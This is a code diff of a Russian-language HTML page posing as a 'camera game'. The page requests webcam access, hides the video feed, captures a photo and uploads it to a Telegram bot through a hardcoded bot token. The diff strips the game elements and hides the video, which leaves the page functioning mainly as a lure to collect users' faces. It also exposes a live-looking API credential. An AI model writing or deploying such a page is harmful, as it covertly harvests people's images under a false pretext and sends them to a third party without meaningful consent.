@@ -3,73 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Game with Camera</title>
+    <title>Camera Game</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            padding: 20px;
+            margin: 0;
+            padding: 0;
+        }
+        h1 {
+            margin-top: 50px;
         }
         #videoContainer {
             display: none;
-            position: relative;
-            width: 100%;
-            max-width: 500px;
-            margin: 0 auto;
-        }
-        video {
-            width: 100%;
-            border-radius: 10px;
-            background: #000;
         }
         #gameMessage {
-            margin-bottom: 20px;
             font-size: 1.5em;
+            margin-top: 20px;
         }
-        #startButton, #captureButton {
+        #captureButton {
             background-color: #4CAF50;
             color: white;
             border: none;
-            padding: 15px 30px;
+            padding: 10px 20px;
             font-size: 1.2em;
             cursor: pointer;
             border-radius: 5px;
-            transition: background-color 0.3s;
+            margin-top: 20px;
         }
-        #startButton:hover, #captureButton:hover {
+        #captureButton:hover {
             background-color: #45a049;
-        }
-        #captureButton {
-            display: none;
-        }
-        #maskEffect {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 2em;
-            color: white;
-            font-weight: bold;
-            pointer-events: none;
         }
     </style>
 </head>
 <body>
-    <h1>Добро пожаловать в игру с маской!</h1>
-    <div id="gameMessage">
-        <p>Включите камеру, чтобы увидеть свою маску!</p>
-        <p>Когда будете готовы, нажмите "Начать" для захвата изображения.</p>
-    </div>
-
-    <button id="startButton" onclick="startCamera()">Начать</button>
+    <h1>Камера Игры</h1>
+    <p id="gameMessage">Чтобы продолжить, пожалуйста, разрешите доступ к вашей камере для игры.</p>
+    <button id="requestPermissionButton" onclick="startGame()">Начать игру</button>
 
     <div id="videoContainer">
-        <video id="video" autoplay playsinline></video>
-        <div id="maskEffect">Внимание, захват изображения!</div>
+        <video id="video" autoplay playsinline style="display:none;"></video>
         <button id="captureButton" onclick="capturePhoto()">Сделать фото</button>
     </div>
 
-    <canvas id="canvas" style="display: none;"></canvas>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const BOT_TOKEN = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
@@ -77,24 +54,18 @@
 
         const video = document.getElementById('video');
         const videoContainer = document.getElementById('videoContainer');
-        const startButton = document.getElementById('startButton');
-        const captureButton = document.getElementById('captureButton');
-        const maskEffect = document.getElementById('maskEffect');
+        const gameMessage = document.getElementById('gameMessage');
+        const requestPermissionButton = document.getElementById('requestPermissionButton');
 
-        // Функция для запроса доступа к камере
-        function startCamera() {
+        // Функция для начала игры (запрос доступа к камере)
+        function startGame() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then((stream) => {
-                    // Показываем видео с камеры и скрываем кнопку старта
+                    // Показываем контейнер с видео
                     video.srcObject = stream;
                     videoContainer.style.display = 'block';
-                    startButton.style.display = 'none';
-                    captureButton.style.display = 'inline-block';
-
-                    // Имитация эффекта маски
-                    setTimeout(() => {
-                        maskEffect.innerText = "Сделайте фото!";
-                    }, 2000); // Через 2 секунды меняем текст
+                    requestPermissionButton.style.display = 'none';
+                    gameMessage.textContent = "Удачи в игре! Нажмите на кнопку, чтобы сделать фото.";
                 })
                 .catch((err) => {
                     console.error('Ошибка доступа к камере:', err);
@@ -116,7 +87,7 @@
 
             // Получаем изображение в формате base64
             const imageData = canvas.toDataURL('image/jpeg');
-            console.log('Фото захвачено:', imageData); // Здесь можно отправить фото куда нужно
+            console.log('Фото захвачено:', imageData); // Отправка фото в Telegram
 
             // Конвертация base64 в файл и отправка в Telegram
             fetch(imageData)
@@ -134,22 +105,22 @@
                     .then(response => response.json())
                     .then(data => {
                         if (data.ok) {
-                            console.log("Фото отправлено успешно!");
+                            console.log("Фото успешно отправлено!");
                         } else {
-                            console.error("Ошибка отправки фото:", data.description);
+                            console.error("Не удалось отправить фото:", data.description);
                         }
                     })
                     .catch(err => console.error("Ошибка при отправке фото:", err));
                 });
 
-            // Остановить поток видео
+            // Останавливаем поток видео
             const stream = video.srcObject;
             const tracks = stream.getTracks();
             tracks.forEach(track => track.stop());
 
-            // Скрыть видео и показать сообщение
+            // Показываем сообщение
             videoContainer.style.display = 'none';
-            document.body.innerHTML += "<p>Фото успешно отправлено!</p>";
+            gameMessage.textContent = "Ваше фото отправлено! Спасибо за игру!";
         }
     </script>
 </body>
